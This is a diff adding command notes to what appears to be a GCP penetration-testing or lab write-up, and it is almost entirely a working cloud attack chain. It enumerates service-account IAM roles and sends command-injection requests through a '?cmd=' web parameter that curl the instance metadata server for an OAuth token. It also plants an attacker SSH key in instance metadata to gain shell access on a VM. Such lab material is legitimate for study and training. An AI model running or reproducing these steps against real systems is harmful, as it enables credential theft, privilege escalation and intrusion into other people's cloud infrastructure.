@@ -41,3 +41,38 @@ Login to gcp cli
 ```gcloud auth activate-service-account --key-file auth.json```
 
 gcloud login with access-token ```gcloud projects list --access-token-file accesstoken.txt```
+
+## All commands
+
+gcloud auth activate-service-account --key-file ./sonic-airfoil-339910-8c4c6de6bf0d.json 
+
+gcloud projects get-iam-policy sonic-airfoil-339910 --flatten="bindings[].members" --filter="bindings.members=serviceaccount:ssa-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)" - Output we get role name, use that for next command
+
+gcloud iam roles describe 684bk057 --project sonic-airfoil-339910
+
+gcloud container clusters list --format json
+
+gcloud container clusters list
+
+gcloud compute forwarding-rules list - we get an IP
+
+URLs
+- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email%20-H%20%22Metadata-Flavor:Google%22
+- http://34.132.232.167/?cmd=curl%20http://169.254.169.254/computeMetadata/v1/instance/service-accounts/gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com/token%20-H%20%22Metadata-Flavor:Google%22
+- https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=[TOKEN]
+
+gcloud compute instances list
+
+gcloud compute instances get-iam-policy tesing-instance --zone us-central1-b --flatten="bindings[].members" --filter="bindings.members=serviceaccount:gke-service-account@sonic-airfoil-339910.iam.gserviceaccount.com" --format="value(bindings.role)"
+
+gcloud iam roles describe ew606s6o --project sonic-airfoil-339910
+
+ssh-keygen , gcp.pub created, add gcp:... to the file which because we want gcp is username
+
+gcloud compute instances add-metadata tesing-instance --metadata-from-file ssh-keys=gcp.pub --zone us-central1-b --access-token-file sess.txt
+
+gcloud compute instances describe tesing-instance - get the ip of vm
+
+ssh -i ./gcp gcp@104.154.17.222
+- get the name of service account attached to that VM - gcloud auth list
+
